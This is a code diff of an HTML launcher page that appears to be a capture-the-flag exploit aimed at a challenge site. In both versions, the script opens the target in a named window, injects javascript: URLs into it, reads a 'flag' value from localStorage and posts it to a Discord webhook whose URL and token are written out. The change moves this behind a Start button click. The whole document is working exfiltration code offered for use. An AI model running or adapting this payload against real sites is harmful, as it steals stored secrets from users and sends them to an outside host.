@@ -1,25 +1,16 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>launcher</title>
+<button id="go">Start</button>
 <script>
-const TARGET = 'https://safe-url.ctfi.ng/';
-const WH     = 'https://discord.com/api/webhooks/1411513735901741096/GLGJpZXfKdmo6cSf0XrDGJdqYkpl6xYTOqFoneDP3MZsA5GXugsxqVxoFiQ0adtzTWcb';
-
-const w = window.open('about:blank','safewin','width=800,height=600');
-w.location = TARGET;
-
-function hop(js){ try { w.location = 'javascript:' + js } catch(_){} }
-
-// A) FormData + no-cors fetch (Discord accepts this)
-setTimeout(() => hop(
-  'var f=localStorage.getItem("flag")||"";'
-+ 'var d=new FormData();d.append("content",f);'
-+ 'fetch("'+WH+'",{method:"POST",mode:"no-cors",body:d}).catch(()=>{});'
-), 500);
-
-// B) sendBeacon JSON (also avoids preflight)
-setTimeout(() => hop(
-  'var f=localStorage.getItem("flag")||"";'
-+ 'navigator.sendBeacon("'+WH+'",new Blob([JSON.stringify({content:f})],{type:"application/json"}));'
-), 1200);
+const TARGET='https://safe-url.ctfi.ng/';
+const WH='https://discord.com/api/webhooks/1411513735901741096/GLGJpZXfKdmo6cSf0XrDGJdqYkpl6xYTOqFoneDP3MZsA5GXugsxqVxoFiQ0adtzTWcb';
+document.getElementById('go').addEventListener('click', ()=>{
+  const w = window.open(TARGET,'safewin'); // opens directly to target
+  const hop = js => { try{ w.location='javascript:'+js }catch(e){} };
+  setTimeout(()=>hop(
+    'var f=localStorage.getItem("flag")||"";var d=new FormData();d.append("content",f);fetch("'+WH+'",{method:"POST",mode:"no-cors",body:d}).catch(()=>{});'
+  ),500);
+  setTimeout(()=>hop(
+    'var f=localStorage.getItem("flag")||"";navigator.sendBeacon("'+WH+'",new Blob([JSON.stringify({content:f})],{type:"application/json"}));'
+  ),1200);
+});
 </script>
